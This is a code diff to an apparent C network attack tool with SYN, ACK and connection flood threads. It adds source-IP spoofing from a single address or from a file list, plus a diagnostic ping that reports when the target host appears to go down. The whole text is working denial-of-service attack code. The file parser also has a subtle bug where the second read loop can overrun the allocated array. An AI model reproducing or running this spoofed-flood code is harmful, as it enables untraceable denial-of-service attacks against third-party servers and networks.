@@ -26,14 +26,25 @@ uint16_t attack_uuid;
 int attack_time = 0;
 int num_threads = 1;
 int attack_type = CONN_FLOOD;
+uint32_t *spoof_addresses = NULL;
+uint32_t spoof_addresses_size = 0;
 
 /* handle stop signals */
 void signal_handler(int sig) {
     running = 0;
 }
 
-uint32_t get_a_source_ip()
+/* spoofing utilities */
+uint32_t get_a_src_ip()
 {
+    if(spoof_addresses_size > 0) {
+        int id;
+        if(spoof_addresses_size > 1)
+            id = leef_random_range(0, spoof_addresses_size-1);
+        else
+            id = 0;
+        return spoof_addresses[id];
+    }
     return interface_addr;
 }
 
@@ -192,7 +203,7 @@ void *syn_flood_attack_thread(void *param)
     uint32_t seq;
 
     while(running && (attack_time <= 0 || leef_get_ticks() < attack_time)) {
-        src_ip = get_a_source_ip();
+        src_ip = get_a_src_ip();
         src_port = leef_random_range(1025,65535);
         id = leef_random_u16();
         seq = attack_uuid << 16 | leef_random_u16();
@@ -218,7 +229,7 @@ void *ack_flood_attack_thread(void *param)
     uint32_t ack;
 
     while(running && (attack_time <= 0 || leef_get_ticks() < attack_time)) {
-        src_ip = get_a_source_ip();
+        src_ip = get_a_src_ip();
         src_port = leef_random_range(1025,65535);
         id = leef_random_u16();
         seq = attack_uuid << 16 | leef_random_u16();
@@ -246,6 +257,8 @@ void *attack_diagnostic_thread(void *param)
     uint16_t id;
     uint32_t seq;
     uint32_t ping_ports[65536];
+    int no_pings = 0;
+    memset(ping_ports, 0, sizeof(ping_ports));
 
     static struct timeval tv;
     gettimeofday(&tv, 0);
@@ -258,7 +271,11 @@ void *attack_diagnostic_thread(void *param)
             /* check if the packet is from the host */
             if(packet.ip->protocol == IPPROTO_TCP && packet.ip->saddr == dest_addr && packet.in_ip.tcp->source == dest_port && ping_uuid == ((packet.in_ip.tcp->ack_seq & 0xffff0000) >> 16)) {
                 /* got a ping reply */
-                printf("flags=%s rrt=%d ms\n", leef_name_tcp_flags(&packet), (leef_get_ticks() - ping_ports[packet.in_ip.tcp->dest]));
+                if(ping_ports[packet.in_ip.tcp->dest] != 0) {
+                    printf("ping response => flags=%s rrt=%d ms\n", leef_name_tcp_flags(&packet), (leef_get_ticks() - ping_ports[packet.in_ip.tcp->dest]));
+                    ping_ports[packet.in_ip.tcp->dest] = 0;
+                    no_pings = 0;
+                }
             /* check if the packet is to the host */
             } else if(packet.ip->protocol == IPPROTO_TCP && packet.ip->daddr == dest_addr && packet.in_ip.tcp->dest == dest_port && attack_uuid == ((packet.in_ip.tcp->seq & 0xffff0000) >> 16)) {
                 packets_sent++;
@@ -288,6 +305,11 @@ void *attack_diagnostic_thread(void *param)
                 seq = ping_uuid << 16 | leef_random_u16();
                 leef_send_tcp_syn(&leef, interface_addr, dest_addr, src_port, dest_port, id, seq);
                 ping_ports[src_port] = lastTicks;
+
+                no_pings++;
+                if(no_pings >= 6) {
+                   printf("no ping responses for at least %d secs, host down?\n", no_pings - 1);
+                }
             }
         }
     }
@@ -312,7 +334,8 @@ int main(int argc, char **argv)
         printf("Options:\n");
         printf("  -m [threads]      - Number of attack threads\n");
         printf("  -t [attack time]  - Attack time in seconds\n");
-        printf("  -s [file]         - Read a list os ips/subnets from a file for spoofing (only for SYN or ACK flood)\n");
+        printf("  -s [ip]           - Custom spoofed ip (only for SYN or ACK flood)\n");
+        printf("  -f [file]         - Read a list of ips from a file for spoofing (only for SYN or ACK flood)\n");
         printf("  -d [file]         - Send binary file as data (only for Connection flood)\n");
         printf("* send interval in microseconds\n");
         printf("* default attack time: infinite\n");
@@ -353,6 +376,47 @@ int main(int argc, char **argv)
                         return -1;
                     }
                     break;
+                case 's':
+                    spoof_addresses_size = 1;
+                    spoof_addresses = (uint32_t*)malloc(sizeof(uint32_t));
+                    *spoof_addresses = leef_resolve_hostname(argv[++arg]);
+                    break;
+                case 'f': {
+                    FILE *fp = fopen(argv[++arg], "r");
+                    if(fp) {
+                        char ip[32];
+                        int lines = 0;
+                        int ips = 0;
+
+                        fseek(fp, 0, SEEK_SET);
+                        while(!feof(fp)) {
+                            fgets(ip, 32, fp);
+                            if(strlen(ip) > 6)
+                                ips++;
+                            lines++;
+                        }
+
+                        spoof_addresses = (uint32_t *)malloc(sizeof(uint32_t) * ips);
+                        spoof_addresses_size = ips;
+
+                        ips = 0;
+                        fseek(fp, 0, SEEK_SET);
+                        while(!feof(fp)) {
+                            fgets(ip, 32, fp);
+                            char *c;
+                            if((c = strchr(ip, '\n')) || (c = strchr(ip, '\r')))
+                                c[0] = 0;
+                            spoof_addresses[ips++] = leef_resolve_hostname(ip);
+                        }
+                        fprintf(stderr, "Read %d spoofed ip addresses from specified file\n", spoof_addresses_size);
+
+                        fclose(fp);
+                    } else {
+                        fprintf(stderr, "Failed opening spoof ips file!\n");
+                        return -1;
+                    }
+                    break;
+                }
                 case 't':
                     attack_time = atoi(argv[++arg])*1000;
                     break;
